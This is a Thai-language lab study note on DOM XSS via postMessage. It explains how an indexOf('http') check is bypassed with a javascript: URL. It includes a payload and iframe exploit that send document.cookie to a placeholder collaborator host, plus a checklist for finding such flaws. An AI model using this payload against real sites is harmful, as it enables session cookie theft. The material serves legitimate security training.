# Pattern 4: addEventListener + JavaScript URL
> [Back to Index](../README.md) | [Previous: postMessage JSON](pattern-3-postmessage-json.md)

---

## Overview

**Source:** `postMessage` data (plain string)
**Sink:** `location.href`, `location`
**Security Check:** `indexOf('http')` → bypass ได้!

---

## ความแตกต่างจาก Pattern 3

| | Pattern 3 | Pattern 4 |
|--|-----------|-----------|
| **Format** | JSON string | Plain string |
| **Security Check** | ไม่มี | มี `indexOf` check |
| **Bypass** | ไม่ต้อง | ต้อง include "http" |

---

## Vulnerable Code

```javascript
window.addEventListener('message', function(e) {
    var url = e.data;

    // Security check: ต้องมี "http" ใน string
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;  // ← SINK!
    }
});
```

---

## Bypass Logic

```
Security Check:
if (url.indexOf('https:') > -1)

Normal URL (ผ่าน):
"https://example.com"
     ↑ มี "https:" → ผ่าน ✓

Payload URL (ก็ผ่าน!):
"javascript:document.location=`https://attacker.com`"
                                ↑ มี "https:" อยู่ข้างใน!
                                → indexOf > -1 → ผ่าน ✓

แต่! url เริ่มด้วย "javascript:" → Execute JS!
```

---

## Payload

```javascript
javascript:document.location=`https://COLLABORATOR?c=`+document.cookie
```

| ส่วน | หน้าที่ |
|------|---------|
| `javascript:` | Execute JavaScript |
| `document.location=` | redirect ไปที่... |
| `` `https://COLLABORATOR?c=` `` | มี `https:` → ผ่าน check! |
| `+document.cookie` | เอา cookie มาต่อ |

---

## Exploit

```html
<iframe src="https://TARGET.net/"
        onload="this.contentWindow.postMessage(
          'javascript:document.location=`https://COLLABORATOR?c=`+document.cookie',
          '*')">
</iframe>
```

---

## indexOf() คืออะไร?

```javascript
string.indexOf(searchValue)
// ถ้าเจอ → return ตำแหน่ง (0, 1, 2, ...)
// ถ้าไม่เจอ → return -1

"hello".indexOf('http') > -1    // false
"https://x.com".indexOf('http') > -1  // true
```

---

## Check Variations

| Check Type | Bypass ด้วย javascript: |
|------------|------------------------|
| `indexOf('http')` | ✅ ได้ |
| `includes('http')` | ✅ ได้ |
| `startsWith('http')` | ❌ ไม่ได้ |
| `^https?://` regex | ❌ ไม่ได้ |

---

## Checklist

```
✓ หา addEventListener('message', ...)
✓ หา security check (indexOf, includes)
✓ เช็คว่า check อะไร (http, https)
✓ หา sink (location.href, location)
✓ สร้าง payload: javascript:...https://...
✓ Cookie ต้องไม่มี HttpOnly
```

---

## Lab Reference
- [PortSwigger Lab: DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

---

> **Next:** [pattern-5-innerhtml-ads.md](pattern-5-innerhtml-ads.md)
